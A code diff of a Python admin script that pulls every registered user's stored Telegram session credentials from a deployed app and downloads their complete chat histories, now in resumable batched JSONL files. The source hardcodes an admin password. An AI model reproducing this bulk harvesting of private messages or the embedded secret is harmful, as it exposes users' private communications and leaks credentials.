@@ -8,6 +8,12 @@ SAFETY: Before connecting, the script pauses the user's monitor on Render
 to avoid simultaneous session usage (which Telegram punishes by permanently
 revoking the auth key). The monitor is always restarted after downloading,
 even if an error occurs.
+
+INCREMENTAL: Messages are saved in JSONL format (one JSON object per line).
+Each batch of messages is flushed to disk immediately, so you can watch
+files populate in real time. Downloads are resumable — if interrupted, the
+script picks up where it left off by reading the oldest message ID already
+saved for each chat.
 """
 
 import os
@@ -27,6 +33,8 @@ ADMIN_PASSWORD = "@eiRclncne14Twm"
 ADMIN_HEADERS = {"X-Admin-Password": ADMIN_PASSWORD}
 DOWNLOADS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "downloads")
 
+BATCH_SIZE = 100  # messages per batch
+
 
 def fetch_users():
     """Fetch all registered users from the deployed app."""
@@ -45,7 +53,7 @@ def fetch_telegram_creds(username):
 
 
 def stop_monitor(username):
-    """Stop the monitor for a user on Render. Returns True if successful."""
+    """Stop the monitor for a user on Render."""
     try:
         resp = requests.post(
             f"{APP_URL}/api/admin/user/{username}/monitor/stop",
@@ -59,7 +67,7 @@ def stop_monitor(username):
 
 
 def start_monitor(username):
-    """Restart the monitor for a user on Render. Returns True if successful."""
+    """Restart the monitor for a user on Render."""
     try:
         resp = requests.post(
             f"{APP_URL}/api/admin/user/{username}/monitor/start",
@@ -98,8 +106,34 @@ def serialize_message(msg):
     }
 
 
+def get_resume_offset(jsonl_path):
+    """Read existing JSONL file and return the oldest message_id for resuming.
+
+    Messages are written newest-first, so the last line has the oldest ID.
+    Returns (existing_count, oldest_message_id) or (0, None) if no file.
+    """
+    if not os.path.exists(jsonl_path):
+        return 0, None
+
+    count = 0
+    oldest_id = None
+    with open(jsonl_path, "r", encoding="utf-8") as f:
+        for line in f:
+            line = line.strip()
+            if not line:
+                continue
+            count += 1
+            try:
+                msg = json.loads(line)
+                oldest_id = msg["message_id"]
+            except (json.JSONDecodeError, KeyError):
+                pass
+
+    return count, oldest_id
+
+
 async def download_user_history(username, creds):
-    """Connect to Telegram and download all message history."""
+    """Connect to Telegram and download all message history incrementally."""
     session_string = creds.get("session_string")
     api_id = int(creds["api_id"])
     api_hash = creds["api_hash"]
@@ -134,32 +168,70 @@ async def download_user_history(username, creds):
 
     for i, dialog in enumerate(dialogs, 1):
         chat_name = dialog.name or f"chat_{dialog.id}"
-        print(f"  [{i}/{len(dialogs)}] {chat_name}...", end=" ", flush=True)
-
-        # Fetch ALL messages for this dialog
-        messages = []
-        try:
-            async for msg in client.iter_messages(dialog, limit=None):
-                messages.append(serialize_message(msg))
-        except Exception as e:
-            print(f"ERROR ({e}), skipping")
-            continue
-
-        print(f"{len(messages)} messages")
-
-        # Save messages
         safe_name = sanitize_name(chat_name)
         chat_dir = os.path.join(user_dir, f"{safe_name}_{dialog.id}")
         os.makedirs(chat_dir, exist_ok=True)
+        jsonl_path = os.path.join(chat_dir, "messages.jsonl")
 
-        with open(os.path.join(chat_dir, "messages.json"), "w", encoding="utf-8") as f:
-            json.dump(messages, f, ensure_ascii=False, indent=2)
+        # Check for resume
+        existing_count, oldest_id = get_resume_offset(jsonl_path)
+        if existing_count > 0:
+            print(f"  [{i}/{len(dialogs)}] {chat_name} (resuming, {existing_count} already saved)...", end=" ", flush=True)
+        else:
+            print(f"  [{i}/{len(dialogs)}] {chat_name}...", end=" ", flush=True)
+
+        # Download messages in batches, appending to JSONL
+        # iter_messages goes newest→oldest; offset_id fetches messages older than that ID
+        new_count = 0
+        try:
+            with open(jsonl_path, "a", encoding="utf-8") as f:
+                batch = []
+                kwargs = {"limit": None}
+                if oldest_id is not None:
+                    kwargs["offset_id"] = oldest_id
+
+                async for msg in client.iter_messages(dialog, **kwargs):
+                    batch.append(serialize_message(msg))
+
+                    if len(batch) >= BATCH_SIZE:
+                        for m in batch:
+                            f.write(json.dumps(m, ensure_ascii=False) + "\n")
+                        f.flush()
+                        new_count += len(batch)
+                        print(f"\r  [{i}/{len(dialogs)}] {chat_name}... {existing_count + new_count} messages", end="", flush=True)
+                        batch = []
+
+                # Write remaining batch
+                if batch:
+                    for m in batch:
+                        f.write(json.dumps(m, ensure_ascii=False) + "\n")
+                    f.flush()
+                    new_count += len(batch)
+
+        except Exception as e:
+            print(f" ERROR ({e}), skipping")
+            # Still record what we have so far
+            summary.append({
+                "chat_id": dialog.id,
+                "name": chat_name,
+                "folder": f"{safe_name}_{dialog.id}",
+                "message_count": existing_count + new_count,
+                "unread_count": dialog.unread_count,
+                "error": str(e),
+            })
+            continue
+
+        total_for_chat = existing_count + new_count
+        if existing_count > 0 and new_count == 0:
+            print(f" {total_for_chat} messages (complete)")
+        else:
+            print(f"\r  [{i}/{len(dialogs)}] {chat_name}... {total_for_chat} messages" + (" (resumed)" if existing_count > 0 else ""))
 
         summary.append({
             "chat_id": dialog.id,
             "name": chat_name,
             "folder": f"{safe_name}_{dialog.id}",
-            "message_count": len(messages),
+            "message_count": total_for_chat,
             "unread_count": dialog.unread_count,
         })
 
